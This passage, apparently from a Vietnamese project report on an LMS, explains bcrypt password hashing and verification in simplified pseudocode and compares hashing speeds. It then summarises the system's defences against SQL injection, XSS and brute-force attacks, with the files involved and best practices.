   # Tạo 16 bytes ngẫu nhiên
   # Encode thành 22 ký tự Base64

3. Kết hợp password + salt:
   combined = password + salt
   # "myPassword123" + "LQv3c1yqBWVHxkd0LHAkCO"

4. Hash với Blowfish cipher:
   for i in range(2^12):  # 4,096 rounds
       combined = blowfish_hash(combined)
   # Mỗi round mất ~0.1ms
   # Tổng: 4,096 rounds × 0.1ms = ~400ms

5. Encode kết quả:
   hash = base64_encode(result)
   # 31 ký tự Base64

6. Kết hợp thành hash string:
   "$2b$12$" + salt + hash
   # "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"
```

**Quá trình verify chi tiết:**

```
1. Input: 
   password = "myPassword123"
   stored_hash = "$2b$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/LewY5GyYqB5Q5Q5Q5"

2. Extract salt từ hash:
   salt = "LQv3c1yqBWVHxkd0LHAkCO"
   cost = 12

3. Hash password với salt đó:
   test_hash = bcrypt.hashpw(password, salt)
   # Sử dụng cùng salt và cost
   # Mất ~400ms

4. So sánh:
   if test_hash == stored_hash:
       return True  # Mật khẩu đúng
   else:
       return False  # Mật khẩu sai
```

**Tại sao cùng mật khẩu nhưng hash khác nhau?**

```python
# Lần 1:
salt1 = random_salt()  # "abc123..."
hash1 = hash("password123" + salt1)  # "$2b$12$abc123...xyz"

# Lần 2:
salt2 = random_salt()  # "def456..." (KHÁC salt1)
hash2 = hash("password123" + salt2)  # "$2b$12$def456...uvw"

# hash1 ≠ hash2 (do salt khác nhau)

# Nhưng verify vẫn đúng:
verify("password123", hash1)  # True (dùng salt1)
verify("password123", hash2)  # True (dùng salt2)
```

### 4.4. Tại sao an toàn?

1. **Slow hashing**: Cost factor 12 làm chậm brute-force attack
2. **Salt ngẫu nhiên**: Mỗi mật khẩu có salt riêng, chống rainbow table
3. **One-way function**: Không thể reverse từ hash về password
4. **Được sử dụng rộng rãi**: bcrypt là tiêu chuẩn công nghiệp

**So sánh với thuật toán nhanh:**

| Thuật toán | Tốc độ | Thời gian brute-force mật khẩu 8 ký tự | Đánh giá |
|------------|--------|----------------------------------------|----------|
| **MD5** | ~1 tỷ hash/giây | ~77 ngày (1 máy) | ❌ Không an toàn |
| **SHA256** | ~100 triệu hash/giây | ~770 ngày (1 máy) | ❌ Vẫn không an toàn |
| **bcrypt (cost=10)** | ~10,000 hash/giây | ~19 năm (1 máy) | ⚠️ Có thể chấp nhận |
| **bcrypt (cost=12)** | ~2,500 hash/giây | ~8,415 năm (1 máy) | ✅ An toàn |
| **bcrypt (cost=14)** | ~625 hash/giây | ~33,660 năm (1 máy) | ✅ Rất an toàn |

**Kết luận:**
- MD5, SHA256: Quá nhanh, không phù hợp cho mật khẩu
- bcrypt: Chậm có chủ đích, phù hợp cho mật khẩu
- Cost 12: Cân bằng tốt giữa bảo mật và hiệu suất

---

## 5. TỔNG HỢP

### 5.1. Bảng tổng hợp các biện pháp bảo mật

| Mối đe dọa | Cơ chế bảo vệ | Cách triển khai | Mức độ bảo vệ |
|------------|---------------|-----------------|---------------|
| **SQL Injection** | Parameterized Queries | SQLAlchemy ORM | ✅ Rất cao |
| **XSS** | Input Validation + Output Encoding | Pydantic + FastAPI + React JSX | ✅ Rất cao |
| **Brute-force password** | Slow Hashing | bcrypt (cost=12) | ✅ Rất cao |

### 5.2. Các file quan trọng

**SQL Injection:**
- `lms_backend/app/database.py` - SQLAlchemy setup
- `lms_backend/app/crud/*.py` - Tất cả CRUD operations
- `lms_backend/app/services/*.py` - Tất cả services

**XSS:**
- `lms_backend/app/schemas/*.py` - Pydantic validation
- `lms_backend/app/routers/*.py` - FastAPI endpoints
- `lms_frontend/src/**/*.tsx` - React components

**bcrypt:**
- `lms_backend/app/auth/security.py` - Hash và verify functions
- `lms_backend/app/crud/user.py` - Sử dụng khi tạo user
- `lms_backend/app/routers/auth.py` - Sử dụng khi đăng nhập

### 5.3. Best Practices đã áp dụng

1. ✅ **Luôn dùng ORM**: Không viết raw SQL
2. ✅ **Validate input**: Pydantic validation cho tất cả input
3. ✅ **Auto-escaping**: FastAPI và React tự động escape
4. ✅ **Hash mật khẩu**: Luôn hash trước khi lưu
5. ✅ **Slow hashing**: bcrypt với cost factor phù hợp

### 5.4. Lưu ý bảo mật

1. **Không bao giờ:**
   - Viết raw SQL với string concatenation
   - Dùng `dangerouslySetInnerHTML` trong React
   - Lưu mật khẩu dạng plaintext

2. **Luôn luôn:**
   - Dùng SQLAlchemy ORM cho database queries
   - Validate input bằng Pydantic
   - Hash mật khẩu bằng bcrypt
   - Escape output khi hiển thị

---

## KẾT LUẬN

Hệ thống LMS đã triển khai đầy đủ các biện pháp bảo mật chống SQL Injection, XSS và brute-force password attack:

- **SQL Injection**: Được bảo vệ tự động bởi SQLAlchemy ORM
- **XSS**: Được bảo vệ bởi Pydantic validation, FastAPI auto-escaping và React JSX auto-escaping
- **Brute-force password**: Được bảo vệ bởi bcrypt slow hashing với cost factor 12

Tất cả các biện pháp này đều được triển khai tự động và không cần can thiệp thủ công, đảm bảo hệ thống an toàn khỏi các mối đe dọa phổ biến.

